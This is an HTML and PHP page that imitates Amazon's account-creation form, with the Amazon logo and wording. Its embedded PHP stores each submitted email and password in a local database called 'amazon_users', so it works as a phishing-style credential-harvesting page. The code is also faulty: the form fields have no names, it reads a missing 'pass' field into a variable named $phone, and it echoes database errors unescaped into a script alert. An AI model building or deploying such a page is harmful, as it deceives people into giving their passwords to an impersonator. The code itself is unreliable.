<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Create Amazon Account</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f6f6f6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      padding: 25px;
      width: 350px;
      border: 1px solid #ddd;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      border-radius: 5px;
    }

    .container img {
      display: block;
      margin: 0 auto 15px;
    }

    .container h2 {
      font-size: 22px;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 15px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    .note {
      font-size: 12px;
      color: #555;
      margin-top: 5px;
    }

    button {
      width: 100%;
      padding: 10px;
      margin-top: 20px;
      background-color: #f0c14b;
      border: 1px solid #a88734;
      border-radius: 4px;
      cursor: pointer;
    }

    .footer {
      font-size: 12px;
      margin-top: 15px;
      text-align: center;
    }

    .footer a {
      color: #0066c0;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" height="40">
    <h2>Create Account</h2>
    <form action="login.php" method="post">

        <label for="name">Your name</label>
        <input type="text" id="name" placeholder="First and last name">
    
        <label for="email">Email</label>
        <input type="email" id="email">
    
        <label for="password">Password</label>
        <input type="password" id="password" placeholder="At least 6 characters">
        <div class="note">Passwords must be at least 6 characters.</div>
    
        <label for="repassword">Re-enter password</label>
        <input type="password" id="repassword">
    
        <button>Create your Amazon account</button>
    </form>

    <div class="note">
      By creating an account, you agree to Amazon's
      <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
    </div>

    <div class="footer">
      Already have an account? <a href="#">Sign in ›</a>
    </div>
  </div>
  <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $servername = "localhost";
            $username = "root";
            $password = "";
            $dbname = "amazon_users";

            // Create connection
            $conn = new mysqli($servername, $username, $password, $dbname);

            // Check connection
            if ($conn->connect_error) {
                die("Connection failed: " . $conn->connect_error);
            }

            // Get form data
            
            $email = $_POST['email'];
            $phone = $_POST['pass'];

            // Prepare and bind
            $stmt = $conn->prepare("INSERT INTO users(name, password) VALUES (?, ?)");
            $stmt->bind_param("ss", $email, $phone);

            // Execute the statement
            if ($stmt->execute()) {
                echo "<script>alert('signed in')</script>";
            } else {
                echo "<script>alert('".$stmt->error."')</script>";
            }

            // Close the connection
            $stmt->close();
            $conn->close();
        }
        ?>
</body>
</html>

